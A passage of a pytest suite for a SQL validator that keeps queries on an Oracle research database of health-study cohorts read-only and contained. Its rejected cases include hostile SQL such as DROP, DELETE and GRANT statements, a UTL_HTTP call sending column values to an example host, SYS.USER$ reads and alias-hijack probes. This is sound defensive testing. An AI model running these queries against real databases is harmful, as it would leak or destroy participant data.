import time

import pytest

from datalab.data.sqlcheck import ORACLE_FUNCTIONS, SqlRejected, TableRef, check_sql

from .sql_samples import SAMPLE_CALLS

COHORTS = frozenset({"IHS_2024", "IHS_2025", "IHS_2026"})


def ok(sql: str):
    # Column resolution has its own tests below (TestColumns).
    return check_sql(sql, allowed_schemas=COHORTS, columns=None)


def rejected(sql: str) -> str:
    with pytest.raises(SqlRejected) as info:
        ok(sql)
    return str(info.value)


class TestAllowed:
    def test_simple_select_reports_tables_and_binds(self):
        result = ok(
            "SELECT STUDY_PARTICIPANT_ID, TRACKERSTEPS FROM IHS_2025.VFITBITDAILYDATA "
            "WHERE RECORD_DATE >= TO_DATE(:start_date, 'YYYY-MM-DD')"
        )
        assert result.tables == (TableRef("IHS_2025", "VFITBITDAILYDATA"),)
        assert result.binds == ("start_date",)
        assert result.warnings == ()

    def test_cte_names_are_not_tables(self):
        result = ok("WITH d AS (SELECT a FROM IHS_2025.T) SELECT COUNT(*) FROM d")
        assert result.tables == (TableRef("IHS_2025", "T"),)

    def test_union_across_cohorts(self):
        result = ok("SELECT a FROM IHS_2024.T UNION ALL SELECT a FROM ihs_2025.t")
        assert result.schemas == {"IHS_2024", "IHS_2025"}

    def test_subquery_tables_are_found(self):
        result = ok("SELECT * FROM IHS_2025.A WHERE id IN (SELECT id FROM IHS_2026.B)")
        assert {str(t) for t in result.tables} == {"IHS_2025.A", "IHS_2026.B"}

    def test_trailing_semicolon_and_comments(self):
        assert ok("SELECT a /* note */ FROM IHS_2025.T -- end\n;").tables

    def test_semicolon_inside_string_is_not_a_second_statement(self):
        assert ok("SELECT 'a;b' AS x FROM dual").tables == ()

    def test_common_oracle_functions(self):
        ok(
            "SELECT TRUNC(RECORD_DATE), NVL(a, 0), DECODE(a, 1, 'x'), TO_CHAR(b, 'YYYY'), "
            "ROW_NUMBER() OVER (PARTITION BY id ORDER BY d), FROM_TZ(CAST(t AS TIMESTAMP), 'UTC') "
            "FROM IHS_2025.T FETCH FIRST 10 ROWS ONLY"
        )

    def test_select_star_warns(self):
        assert "SELECT *" in ok("SELECT * FROM IHS_2025.T").warnings[0]
        assert "SELECT *" in ok("SELECT t.* FROM IHS_2025.T t").warnings[0]

    def test_count_star_doesnt_warn(self):
        assert ok("SELECT COUNT(*) FROM IHS_2025.T").warnings == ()


class TestRejected:
    @pytest.mark.parametrize(
        "sql",
        [
            "DELETE FROM IHS_2026.T",
            "UPDATE IHS_2026.T SET a = 1",
            "INSERT INTO IHS_2026.T VALUES (1)",
            "ALTER TABLE IHS_2026.T ADD (x NUMBER)",
            "DROP TABLE IHS_2026.T",
            "CREATE TABLE x AS SELECT * FROM IHS_2025.T",
            "MERGE INTO IHS_2026.T t USING IHS_2025.S s ON (t.id = s.id) "
            "WHEN MATCHED THEN UPDATE SET t.a = s.a",
            "TRUNCATE TABLE IHS_2026.T",
            "GRANT SELECT ON IHS_2025.T TO PUBLIC",
        ],
    )
    def test_writes_and_ddl(self, sql):
        rejected(sql)

    def test_multiple_statements(self):
        assert "one statement" in rejected("SELECT 1 FROM dual; DELETE FROM IHS_2026.T")

    def test_plsql_block(self):
        rejected("BEGIN NULL; END;")

    def test_plsql_function_in_with(self):
        rejected("WITH FUNCTION f RETURN NUMBER IS BEGIN RETURN 1; END; SELECT f FROM dual")

    def test_for_update(self):
        rejected("SELECT a FROM IHS_2025.T FOR UPDATE")

    def test_select_into(self):
        rejected("SELECT a INTO b FROM IHS_2025.T")

    def test_database_link(self):
        assert "Database links" in rejected("SELECT * FROM IHS_2025.T@remote_db")

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT UTL_HTTP.REQUEST('http://example.org/?x=' || a) FROM IHS_2025.T",
            "SELECT SYS.DBMS_PIPE.SEND_MESSAGE('x') FROM dual",
            "SELECT HTTPURITYPE('http://example.org').getclob() FROM dual",
        ],
    )
    def test_calls_that_could_reach_outside_the_database(self, sql):
        rejected(sql)

    def test_unknown_function(self):
        message = rejected("SELECT MY_CUSTOM_FN(a) FROM IHS_2025.T")
        assert "isn't one of Oracle's built-in SQL functions" in message

    def test_xml_query_functions(self):
        rejected("SELECT * FROM XMLTABLE('/a' PASSING XMLTYPE('<a/>'))")

    def test_sequences(self):
        rejected("SELECT my_seq.NEXTVAL FROM dual")

    def test_unqualified_table(self):
        assert "Qualify" in rejected("SELECT * FROM all_tables")

    def test_schema_not_allowed(self):
        assert "SYS" in rejected("SELECT * FROM SYS.USER$")

    def test_empty(self):
        rejected("   ;  ")

    def test_too_long(self):
        rejected("SELECT a FROM IHS_2025.T WHERE a IN (" + ",".join(["1"] * 40000) + ")")

    def test_unparseable(self):
        assert "parsed" in rejected("SELEC a FORM t")


class TestCteScope:
    """An unqualified name is only a CTE if a WITH clause around it defines it."""

    def test_cte_chain_is_allowed(self):
        result = ok(
            "WITH a AS (SELECT id FROM IHS_2025.T), b AS (SELECT id FROM a) SELECT * FROM b"
        )
        assert result.tables == (TableRef("IHS_2025", "T"),)

    def test_cte_in_subquery_and_union(self):
        ok("SELECT * FROM (WITH a AS (SELECT 1 x FROM dual) SELECT x FROM a)")
        ok("WITH a AS (SELECT 1 x FROM dual) SELECT x FROM a UNION ALL SELECT x FROM a")

    def test_nested_cte_does_not_hide_an_outer_reference(self):
        assert "Qualify" in rejected(
            "SELECT * FROM (WITH all_users AS (SELECT 1 x FROM dual) "
            "SELECT x FROM all_users) a, all_users"
        )

    def test_a_cte_body_cannot_use_a_later_cte_name(self):
        # Oracle resolves `b` in the first CTE as a real object, not the later CTE.
        assert "Qualify" in rejected(
            "WITH a AS (SELECT * FROM b), b AS (SELECT 1 x FROM dual) SELECT * FROM a"
        )

    def test_sibling_subquery_ctes_are_not_visible(self):
        assert "Qualify" in rejected(
            "SELECT * FROM (WITH s AS (SELECT 1 x FROM dual) SELECT x FROM s) p, "
            "(SELECT x FROM s) q"
        )


class TestFunctions:
    """Oracle's built-in SQL functions are allowed; anything else, and the few
    built-ins that can reach outside the database, are not."""

    def test_every_allowed_function_has_a_sample_call(self):
        assert set(SAMPLE_CALLS) == ORACLE_FUNCTIONS

    @pytest.mark.parametrize("name", sorted(SAMPLE_CALLS))
    def test_allowed_function(self, name):
        ok(f"SELECT {SAMPLE_CALLS[name]} FROM IHS_2025.T")

    @pytest.mark.parametrize(
        "call",
        [
            "SYS_CONTEXT('USERENV', 'IP_ADDRESS')",
            "USERENV('TERMINAL')",
            'XMLELEMENT("a", x)',  # sqlglot models this one
            "XMLAGG(x)",
            "XMLTYPE(s)",
            "EXTRACTVALUE(s, '/a')",
            "BFILENAME('DIR', 'f.txt')",
            "DUMP(x)",
            "SYS_XMLGEN(x)",
        ],
    )
    def test_denied_function(self, call):
        assert "isn't allowed" in rejected(f"SELECT {call} FROM IHS_2025.T")


class TestCallsAsWritten:
    """From the security review: the parser maps some names onto its own
    functions, but Oracle runs the name as written."""

    @pytest.mark.parametrize(
        "call",
        ["MD5('a')", "LEFT('a', 1)", "IFNULL(a, 1)", "SHA2('a', 256)", "DATE_ADD(d, 1)", "YEAR(d)"],
    )
    def test_names_that_arent_oracle_built_ins(self, call):
        assert "isn't one of Oracle's built-in" in rejected(f"SELECT {call} FROM IHS_2025.T")

    def test_quoted_names_must_match_exactly(self):
        message = rejected('SELECT "nvl"(a, 1) FROM IHS_2025.T')
        assert "without quotes" in message
        ok('SELECT "NVL"(a, 1) FROM IHS_2025.T')

    @pytest.mark.parametrize(
        "sql",
        [
            "WITH q (a, b) AS (SELECT 1, 2 FROM DUAL) SELECT a FROM q",
            "SELECT CAST(a AS NUMBER(10, 2)), CAST(b AS VARCHAR2(20)) FROM IHS_2025.T",
            "SELECT INTERVAL '5' DAY(3) TO SECOND(2) FROM DUAL",
            "SELECT COUNT(DISTINCT(a)) FROM IHS_2025.T WHERE a IN (1, 2)",
            "SELECT a FROM IHS_2025.T WHERE EXISTS (SELECT 1 FROM DUAL)",
            "SELECT a FROM IHS_2025.T GROUP BY ROLLUP (a)",
            # Clauses the tokenizer reads as one token, followed by "(".
            "SELECT a FROM IHS_2025.T ORDER BY (a + 1)",
            "SELECT a FROM IHS_2025.T GROUP BY (a)",
            "SELECT ROW_NUMBER() OVER (PARTITION BY (a) ORDER BY (b)) FROM IHS_2025.T",
            "SELECT LEVEL FROM DUAL START WITH (1 = 1) CONNECT BY (LEVEL <= 3)",
            "SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 3 ORDER SIBLINGS BY (LEVEL)",
        ],
    )
    def test_sql_words_that_take_parentheses(self, sql):
        ok(sql)

    def test_a_type_name_only_counts_after_as(self):
        assert "isn't one of Oracle's built-in" in rejected("SELECT NUMBER(5) FROM IHS_2025.T")


# A small catalog: T has a quoted lowercase column, as the real survey views do.
CATALOG = {
    "IHS_2025": {
        "T": {"A": "NUMBER", "B": "VARCHAR2", "D": "DATE", "interest0": "NUMBER"},
        "U": {"A": "NUMBER", "C": "DATE"},
    }
}


def ok_with_catalog(sql: str):
    return check_sql(sql, allowed_schemas=COHORTS, columns=CATALOG)


def rejected_with_catalog(sql: str) -> str:
    with pytest.raises(SqlRejected) as info:
        ok_with_catalog(sql)
    return str(info.value)


class TestColumns:
    """Oracle runs a name that isn't a column as a call with no arguments, so
    every column must be a real column of a table in its scope."""

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT ORA_DATABASE_NAME FROM DUAL",
            "SELECT ORA_LOGIN_USER FROM DUAL",
            "SELECT DBMS_UTILITY.PORT_STRING FROM DUAL",
            "SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL",
            "SELECT UTL_HTTP.REQUEST FROM DUAL",
            "SELECT 1 FROM DUAL WHERE DBMS_LOCK.SLEEP IS NULL",
            "SELECT DATALAB_RO.DL_NOPAREN FROM DUAL",
            "SELECT secret_fn FROM IHS_2025.T",
            "SELECT a FROM IHS_2025.T UNION SELECT secret_fn FROM DUAL",
            "SELECT (SELECT secret_fn FROM DUAL) FROM IHS_2025.T",
            "SELECT a FROM IHS_2025.NOT_IN_CATALOG",
            "SELECT interest0 FROM IHS_2025.T",  # Oracle reads this as INTEREST0
            # Names qualify takes for an alias defined elsewhere; Oracle would run
            # them as functions (confirmed with decoys on the synthetic database).
            "WITH q (evil) AS (SELECT 1 FROM DUAL) "
            "SELECT 'y' FROM DUAL GROUP BY dummy HAVING evil = 'HIJACKED'",
            "SELECT 'x' AS evil FROM DUAL WHERE 1 = 0 "
            "UNION ALL SELECT 'y' FROM DUAL GROUP BY dummy HAVING evil = 'x'",
            "SELECT 1 AS evil FROM DUAL WHERE evil IS NULL",
            # A string literal isn't an output name ORDER BY can use.
            "SELECT 'BOOM' FROM IHS_2025.T ORDER BY boom",
            'SELECT 1 "evile" FROM DUAL ORDER BY evile',  # "evile" isn't EVILE
            'SELECT COUNT(*) FROM IHS_2025.T ORDER BY "_COL_0"',
            # Functions read as tables (Oracle 12.2+ needs no TABLE keyword).
            "SELECT * FROM IHS_2025.MD5('x')",
            "SELECT * FROM IHS_2025.NVL('x')",
            'SELECT * FROM "IHS_2025"."NVL"(\'x\')',
        ],
    )
    def test_names_that_arent_columns(self, sql):
        rejected_with_catalog(sql)

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT a, b FROM IHS_2025.T WHERE ROWNUM <= 5",
            'SELECT "interest0" FROM IHS_2025.T',
            "SELECT t.a, u.c FROM IHS_2025.T t JOIN IHS_2025.U u ON u.a = t.a",
            "SELECT LEVEL, SYSDATE, USER, SYSTIMESTAMP FROM DUAL CONNECT BY LEVEL <= 3",
            "SELECT d.dummy FROM DUAL d",
            "WITH x AS (SELECT a AS n FROM IHS_2025.T) SELECT n FROM x ORDER BY n",
            "SELECT a AS z, COUNT(*) AS k FROM IHS_2025.T GROUP BY a ORDER BY z",
            "SELECT a FROM IHS_2025.T WHERE EXISTS (SELECT 1 FROM IHS_2025.U WHERE c = d)",
            "SELECT s.a FROM (SELECT a FROM IHS_2025.T) s",
            "SELECT * FROM IHS_2025.T",
            "SELECT a FROM IHS_2025.T WHERE d >= :start_date",
            "SELECT a, ROW_NUMBER() OVER (PARTITION BY b ORDER BY d) AS rn FROM IHS_2025.T",
            "WITH q (n) AS (SELECT a FROM IHS_2025.T) SELECT n FROM q ORDER BY n",
            "SELECT a AS z FROM IHS_2025.T ORDER BY z + 1",
            # Unaliased expressions in ORDER BY, repeated or by position.
            "SELECT a, COUNT(*) FROM IHS_2025.T GROUP BY a ORDER BY COUNT(*) DESC",
            "SELECT TRUNC(d, 'MM'), COUNT(*) FROM IHS_2025.T GROUP BY TRUNC(d, 'MM') ORDER BY 1",
            'SELECT a AS "Steps" FROM IHS_2025.T ORDER BY "Steps"',
            "SELECT a FROM IHS_2025.T t "
            "WHERE a = (SELECT MAX(u.a) FROM IHS_2025.U u WHERE u.c = t.d)",
        ],
    )
    def test_real_columns_and_pseudo_columns(self, sql):
        ok_with_catalog(sql)

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT 1 FROM DUAL FETCH FIRST EVILE ROWS ONLY",
            "SELECT 1 FROM DUAL FETCH FIRST DBMS_RANDOM.VALUE ROWS ONLY",
            "SELECT 1 FROM DUAL OFFSET ORA_DATABASE_NAME ROWS",
        ],
    )
    def test_row_counts_must_be_numbers_or_binds(self, sql):
        assert "FETCH and OFFSET" in rejected_with_catalog(sql)

    def test_row_counts(self):
        ok_with_catalog("SELECT a FROM IHS_2025.T OFFSET 5 ROWS FETCH NEXT :n ROWS ONLY")
        ok_with_catalog("SELECT a FROM IHS_2025.T FETCH FIRST 10 ROWS ONLY")

    def test_with_an_empty_catalog_nothing_runs(self):
        with pytest.raises(SqlRejected):
            check_sql("SELECT a FROM IHS_2025.T", allowed_schemas=COHORTS, columns={})

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT 'x' FROM DUAL ORDER BY 1",
            "SELECT 1 FROM DUAL ORDER BY 1",
            "SELECT a, 'x' FROM IHS_2025.T ORDER BY 2",
            "SELECT a, 'BOOM' FROM IHS_2025.T ORDER BY 2 DESC, 1",
            "SELECT a + 1, b FROM IHS_2025.T ORDER BY 1",
            "SELECT COUNT(*) FROM IHS_2025.T ORDER BY 1",
            "SELECT b, COUNT(*) FROM IHS_2025.T GROUP BY b ORDER BY 2 DESC NULLS LAST",
            "SELECT 'x' FROM DUAL UNION SELECT 'y' FROM DUAL ORDER BY 1",
            "SELECT a, 'T' FROM IHS_2025.T UNION ALL SELECT a, 'U' FROM IHS_2025.U ORDER BY 2, 1",
            "SELECT * FROM (SELECT 'x' FROM DUAL ORDER BY 1)",
        ],
    )
    def test_order_by_position(self, sql):
        # qualify names SELECT 'x' after its value, X, so ORDER BY 1 would
        # otherwise reach the resolved-column check as a bare X.
        ok_with_catalog(sql)

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT 'x' FROM DUAL ORDER BY boom",
            "SELECT 'x' FROM DUAL ORDER BY x",
            "SELECT 'x', 1 FROM DUAL ORDER BY 2, boom",
            "SELECT 'x' FROM DUAL UNION SELECT 'y' FROM DUAL ORDER BY x",
            "SELECT 'x' FROM DUAL UNION SELECT 'y' FROM DUAL ORDER BY 1, y",
            "SELECT COUNT(*) FROM IHS_2025.T ORDER BY 1, secret_fn",
        ],
    )
    def test_order_by_an_unknown_bare_name(self, sql):
        rejected_with_catalog(sql)


class TestSecondReview:
    """From the second security review."""

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT ORA_DATABASE_NAME, DBMS_UTILITY.PORT_STRING FROM (SELECT 1 x FROM DUAL)"
            " PIVOT (COUNT(*) FOR x IN (1 AS a))",
            "SELECT ORA_LOGIN_USER FROM (SELECT 1 x FROM DUAL) UNPIVOT (v FOR k IN (x))",
        ],
    )
    def test_pivot_is_refused(self, sql):
        assert "PIVOT and UNPIVOT aren't supported" in rejected_with_catalog(sql)

    def test_an_alias_in_having(self):
        sql = "SELECT a AS evil, COUNT(*) FROM IHS_2025.T GROUP BY a HAVING evil IS NULL"
        assert "HAVING can't use the name" in rejected_with_catalog(sql)
        ok_with_catalog("SELECT a AS n, COUNT(*) FROM IHS_2025.T GROUP BY a HAVING COUNT(*) > 1")

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT 'x' AS evil FROM DUAL WHERE 1=0 UNION ALL"
            " SELECT 'y' FROM DUAL GROUP BY dummy HAVING evil = 'HIJACKED'",
            "SELECT 'y' FROM DUAL GROUP BY dummy HAVING ORA_DATABASE_NAME = 'FREEPDB1'"
            " UNION ALL SELECT 'x' AS ORA_DATABASE_NAME FROM DUAL WHERE 1=0",
            "SELECT * FROM (SELECT 'x' AS evil FROM DUAL UNION ALL"
            " SELECT 'y' FROM DUAL GROUP BY dummy HAVING evil = 'x')",
        ],
    )
    def test_an_alias_from_another_branch_in_having(self, sql):
        assert "HAVING can't use the name" in rejected_with_catalog(sql)

    def test_q_quoted_strings_are_refused_cleanly(self):
        rejected_with_catalog("SELECT q'[ ' ]' FROM DUAL")

    def test_grouping_sets(self):
        sql = "SELECT a, b, COUNT(*) FROM IHS_2025.T GROUP BY GROUPING SETS ((a), (b), ())"
        ok_with_catalog(sql)

    def test_recursive_with_needs_qualified_columns(self):
        recursive = (
            "WITH r (n) AS (SELECT 1 FROM DUAL UNION ALL SELECT {n} + 1 FROM r WHERE {n} < 3)"
        )
        assert "qualify its columns" in rejected_with_catalog(
            recursive.format(n="n") + " SELECT n FROM r"
        )
        ok_with_catalog(recursive.format(n="r.n") + " SELECT n FROM r")


def test_sql_that_isnt_text_is_refused_not_an_error():
    assert "isn't text (U+D800" in rejected("SELECT 1 FROM IHS_2025.PARTICIPANTS -- \ud800")


# Long text and mixed-case names, as in the survey dictionary and baseline views.
SURVEY = {
    "IHS_2025": {
        "STG_SURVEYDICTIONARY": {
            "SURVEYNAME": "VARCHAR2(2000)",
            "RESULTIDENTIFIER": "VARCHAR2(300)",
            "QUESTIONTEXT": "CLOB",
            "ANSWERCHOICES": "CLOB",
        },
        "VW_BASELINE_SURVEY": {
            "PARTICIPANTIDENTIFIER": "VARCHAR2(15)",
            "Bdate": "DATE",
            "interest0": "NUMBER",
            "Black tea": "NUMBER",
            "PHOTO": "BLOB",
        },
    }
}
D = "IHS_2025.STG_SURVEYDICTIONARY"
B = "IHS_2025.VW_BASELINE_SURVEY"


def survey_ok(sql: str):
    return check_sql(sql, allowed_schemas=COHORTS, columns=SURVEY)


def survey_rejected(sql: str) -> str:
    with pytest.raises(SqlRejected) as info:
        survey_ok(sql)
    return str(info.value)


FIX = "TO_CHAR(SUBSTR(QUESTIONTEXT, 1, 1000)) is the first 1,000 characters"


class TestLongText:
    """Oracle can't compare, sort or group a CLOB: refused before it runs, with
    the fix (tests/test_sqlcheck_oracle.py runs these on the synthetic database)."""

    @pytest.mark.parametrize(
        ("sql", "context"),
        [
            (f"SELECT DISTINCT QUESTIONTEXT FROM {D}", "SELECT DISTINCT"),
            (f"SELECT UNIQUE QUESTIONTEXT FROM {D}", "SELECT DISTINCT"),
            (f"SELECT COUNT(*) FROM {D} GROUP BY QUESTIONTEXT", "GROUP BY"),
            (f"SELECT COUNT(*) FROM {D} GROUP BY ROLLUP(SURVEYNAME, QUESTIONTEXT)", "GROUP BY"),
            (f"SELECT SURVEYNAME FROM {D} ORDER BY QUESTIONTEXT", "ORDER BY"),
            (f"SELECT QUESTIONTEXT FROM {D} ORDER BY 1", "ORDER BY"),
            (f"SELECT SURVEYNAME, QUESTIONTEXT q FROM {D} ORDER BY q", "ORDER BY"),
            (f"SELECT ROW_NUMBER() OVER (ORDER BY QUESTIONTEXT) FROM {D}", "ORDER BY"),
            (f"SELECT ROW_NUMBER() OVER (PARTITION BY QUESTIONTEXT ORDER BY SURVEYNAME) FROM {D}",
             "PARTITION BY"),
            (f"SELECT QUESTIONTEXT FROM {D} UNION SELECT ANSWERCHOICES FROM {D}", "UNION"),
            (f"SELECT QUESTIONTEXT FROM {D} MINUS SELECT ANSWERCHOICES FROM {D}", "UNION"),
            (f"SELECT QUESTIONTEXT FROM {D} INTERSECT SELECT ANSWERCHOICES FROM {D}", "UNION"),
            (f"SELECT MIN(QUESTIONTEXT) FROM {D}", "MIN()"),
            (f"SELECT MAX(QUESTIONTEXT) FROM {D} GROUP BY SURVEYNAME", "MAX()"),
            (f"SELECT COUNT(DISTINCT QUESTIONTEXT) FROM {D}", "COUNT()"),
            (f"SELECT STATS_MODE(QUESTIONTEXT) FROM {D}", "STATS_MODE()"),
            (f"SELECT LAG(QUESTIONTEXT) OVER (ORDER BY SURVEYNAME) FROM {D}", "LAG()"),
            (f"SELECT 1 FROM {D} WHERE QUESTIONTEXT = 'x'", "a comparison"),
            (f"SELECT 1 FROM {D} WHERE QUESTIONTEXT <> :q", "a comparison"),
            (f"SELECT 1 FROM {D} WHERE QUESTIONTEXT IN ('a', 'b')", "a comparison"),
            (f"SELECT 1 FROM {D} WHERE QUESTIONTEXT NOT IN ('a')", "a comparison"),
            (f"SELECT 1 FROM {D} WHERE QUESTIONTEXT BETWEEN 'a' AND 'b'", "a comparison"),
            (f"SELECT 1 FROM {D} WHERE SURVEYNAME IN (SELECT QUESTIONTEXT FROM {D})",
             "a comparison"),
            (f"SELECT 1 FROM {D} a JOIN {D} b ON a.SURVEYNAME = b.SURVEYNAME "
             "AND a.QUESTIONTEXT = b.QUESTIONTEXT", "a comparison"),
            (f"SELECT CASE QUESTIONTEXT WHEN 'x' THEN 1 END FROM {D}", "a comparison"),
            (f"SELECT DECODE(QUESTIONTEXT, 'x', 1, 0) FROM {D}", "a comparison"),
            (f"SELECT CASE SURVEYNAME WHEN QUESTIONTEXT THEN 1 END FROM {D}", "a comparison"),
            (f"SELECT LEAST(QUESTIONTEXT, 'x') FROM {D}", "LEAST()"),
            (f"SELECT NULLIF(SURVEYNAME, QUESTIONTEXT) FROM {D}", "NULLIF()"),
            (f"SELECT 1 FROM {D} a NATURAL JOIN {D} b", "a comparison"),
            (f"SELECT 1 FROM {D} a JOIN {D} b USING (QUESTIONTEXT)", "a comparison"),
            (f"SELECT LEVEL FROM {D} START WITH SURVEYNAME IS NULL "
             "CONNECT BY PRIOR QUESTIONTEXT = QUESTIONTEXT", "a comparison"),
        ],
    )  # fmt: skip
    def test_a_clob_where_oracle_cant_use_one(self, sql, context):
        message = survey_rejected(sql)
        assert "QUESTIONTEXT" in message and "CLOB" in message and context in message
        assert "DBMS_LOB.SUBSTR isn't available" in message or "COUNT(" in message
        assert "ORA-00932" in message

    @pytest.mark.parametrize(
        "sql",
        [
            f"SELECT DISTINCT SUBSTR(QUESTIONTEXT, 1, 500) FROM {D}",
            f"SELECT DISTINCT UPPER(QUESTIONTEXT) FROM {D}",
            f"SELECT DISTINCT TRIM(QUESTIONTEXT) FROM {D}",
            f"SELECT DISTINCT QUESTIONTEXT || '!' FROM {D}",
            f"SELECT DISTINCT CONCAT(SURVEYNAME, QUESTIONTEXT) FROM {D}",
            f"SELECT DISTINCT REPLACE(QUESTIONTEXT, 'a', 'b') FROM {D}",
            f"SELECT DISTINCT NVL(QUESTIONTEXT, 'none') FROM {D}",
            f"SELECT DISTINCT NVL2(SURVEYNAME, QUESTIONTEXT, SURVEYNAME) FROM {D}",
            f"SELECT DISTINCT DECODE(SURVEYNAME, 'x', QUESTIONTEXT, SURVEYNAME) FROM {D}",
            f"SELECT DISTINCT CASE WHEN SURVEYNAME = 'x' THEN QUESTIONTEXT END FROM {D}",
            # A NULL result doesn't decide the type (from the re-review).
            f"SELECT DISTINCT COALESCE(NULL, QUESTIONTEXT) FROM {D}",
            f"SELECT DISTINCT NVL(NULL, QUESTIONTEXT) FROM {D}",
            f"SELECT DISTINCT NVL2(SURVEYNAME, NULL, QUESTIONTEXT) FROM {D}",
            f"SELECT DISTINCT CASE WHEN SURVEYNAME = 'x' THEN NULL ELSE QUESTIONTEXT END FROM {D}",
            f"SELECT 1 FROM {D} WHERE UPPER(QUESTIONTEXT) = 'X'",
        ],
    )
    def test_functions_of_a_clob_are_still_a_clob(self, sql):
        message = survey_rejected(sql)
        assert "made from the CLOB column QUESTIONTEXT" in message
        assert FIX in message

    def test_through_ctes_subqueries_and_aliases(self):
        cte = f"WITH d AS (SELECT SUBSTR(QUESTIONTEXT, 1, 500) q FROM {D}) SELECT DISTINCT q FROM d"
        assert "made from the CLOB column QUESTIONTEXT" in survey_rejected(cte)
        star = f"WITH d AS (SELECT * FROM {D}) SELECT questiontext FROM d ORDER BY 1"
        assert "QUESTIONTEXT is a CLOB column" in survey_rejected(star)
        derived = f"SELECT s.q FROM (SELECT QUESTIONTEXT q FROM {D}) s ORDER BY s.q"
        assert "ORDER BY" in survey_rejected(derived)
        listed = f"WITH d (name, q) AS (SELECT SURVEYNAME, QUESTIONTEXT FROM {D}) " \
            "SELECT name FROM d GROUP BY name, q"  # fmt: skip
        assert "GROUP BY" in survey_rejected(listed)
        union = f"SELECT SURVEYNAME t FROM {D} UNION ALL SELECT QUESTIONTEXT FROM {D} ORDER BY 1"
        assert "ORDER BY" in survey_rejected(union)

    def test_counting_one(self):
        message = survey_rejected(f"SELECT COUNT(QUESTIONTEXT) FROM {D}")
        assert "use COUNT(LENGTH(QUESTIONTEXT))" in message

    def test_the_code_oracle_gives_depends_on_where(self):
        assert "(ORA-00932; ORA-22849 on newer Oracle)" in survey_rejected(
            f"SELECT MIN(QUESTIONTEXT) FROM {D}"
        )
        assert "the query (ORA-00932)." in survey_rejected(f"SELECT AVG(QUESTIONTEXT) FROM {D}")

    def test_a_blob_and_a_made_clob(self):
        assert "LENGTH(PHOTO) and IS NULL work on it" in survey_rejected(
            f"SELECT DISTINCT PHOTO FROM {B}"
        )
        made = survey_rejected(f"SELECT DISTINCT TO_CLOB(SURVEYNAME) FROM {D}")
        assert made.startswith("TO_CLOB(SURVEYNAME) is a CLOB, and Oracle can't")

    def test_the_query_seen_on_the_real_datalab(self):
        # Adapted to the synthetic schema: passed the check, and Oracle 19c refused it.
        seen = (
            f"SELECT DISTINCT SURVEYNAME, RESULTIDENTIFIER, SUBSTR(QUESTIONTEXT, 1, 500) AS QTEXT "
            f"FROM {D} WHERE SURVEYNAME LIKE '%Baseline%' ORDER BY SURVEYNAME, RESULTIDENTIFIER"
        )
        assert survey_rejected(seen) == (
            "SUBSTR(QUESTIONTEXT, 1, 500) is a CLOB, made from the CLOB column QUESTIONTEXT, "
            "and Oracle can't use a CLOB in SELECT DISTINCT: it would refuse the query "
            "(ORA-00932; ORA-22848 on newer Oracle). Convert it to ordinary text there, "
            "without cutting values silently: TO_CHAR(SUBSTR(QUESTIONTEXT, 1, 1000)) is the "
            "first 1,000 characters (always within Oracle's 4,000-byte limit). For a preview, "
            "that's fine: say it's a preview. For exact grouping or de-duplication, first "
            "check MAX(LENGTH(QUESTIONTEXT)): if it's 1,000 or less, that conversion is the "
            "whole value; if not, group by identifying columns instead and fetch the full "
            "text separately, or report how many values are longer and were cut. Select "
            "LENGTH(QUESTIONTEXT) beside it so a cut shows. SUBSTR, UPPER, TRIM or || alone "
            "still give a CLOB, and DBMS_LOB.SUBSTR isn't available in DataLab. LIKE, IS "
            "NULL, LENGTH and INSTR work on the CLOB as it is."
        )
        survey_ok(
            seen.replace("SUBSTR(QUESTIONTEXT, 1, 500)", "TO_CHAR(SUBSTR(QUESTIONTEXT, 1, 500))")
        )
        retry = f"SELECT SURVEYNAME, MIN(QUESTIONTEXT) FROM {D} GROUP BY SURVEYNAME"
        assert "in MIN()" in survey_rejected(retry)
        survey_ok(retry.replace("MIN(QUESTIONTEXT)", "MIN(TO_CHAR(SUBSTR(QUESTIONTEXT, 1, 1000)))"))

    @pytest.mark.parametrize(
        "sql",
        [
            f"SELECT QUESTIONTEXT, ANSWERCHOICES FROM {D}",
            f"SELECT SURVEYNAME, QUESTIONTEXT FROM {D} ORDER BY SURVEYNAME",
            f"SELECT DISTINCT TO_CHAR(SUBSTR(QUESTIONTEXT, 1, 1000)) FROM {D}",
            f"SELECT DISTINCT CAST(SUBSTR(QUESTIONTEXT, 1, 1000) AS VARCHAR2(4000)) FROM {D}",
            f"SELECT DISTINCT TO_CHAR(QUESTIONTEXT) FROM {D}",
            f"SELECT DISTINCT LENGTH(QUESTIONTEXT), INSTR(QUESTIONTEXT, 'a') FROM {D}",
            f"SELECT 1 FROM {D} WHERE QUESTIONTEXT LIKE '%sleep%'",
            f"SELECT 1 FROM {D} WHERE QUESTIONTEXT NOT LIKE '%sleep%'",
            f"SELECT 1 FROM {D} WHERE REGEXP_LIKE(QUESTIONTEXT, 'sleep', 'i')",
            f"SELECT 1 FROM {D} WHERE QUESTIONTEXT IS NULL OR ANSWERCHOICES IS NOT NULL",
            f"SELECT 1 FROM {D} WHERE LENGTH(QUESTIONTEXT) > 10",
            f"SELECT 1 FROM {D} WHERE TO_CHAR(SUBSTR(QUESTIONTEXT, 1, 100)) = 'x'",
            f"SELECT QUESTIONTEXT FROM {D} UNION ALL SELECT ANSWERCHOICES FROM {D}",
            f"SELECT COUNT(*), COUNT(LENGTH(QUESTIONTEXT)) FROM {D}",
            f"SELECT SURVEYNAME, COUNT(*) FROM {D} GROUP BY SURVEYNAME ORDER BY 2",
            f"SELECT NVL(QUESTIONTEXT, ANSWERCHOICES) FROM {D}",
            f"SELECT DISTINCT INITCAP(SURVEYNAME), NVL2(QUESTIONTEXT, 'y', 'n') FROM {D}",
            # The first result decides the type: these are text.
            f"SELECT DISTINCT NVL(SURVEYNAME, QUESTIONTEXT) FROM {D}",
            f"SELECT DISTINCT NVL2(SURVEYNAME, SURVEYNAME, QUESTIONTEXT) FROM {D}",
            f"SELECT DISTINCT DECODE(SURVEYNAME, 'x', SURVEYNAME, QUESTIONTEXT) FROM {D}",
            f"SELECT GREATEST(SURVEYNAME, QUESTIONTEXT) FROM {D}",
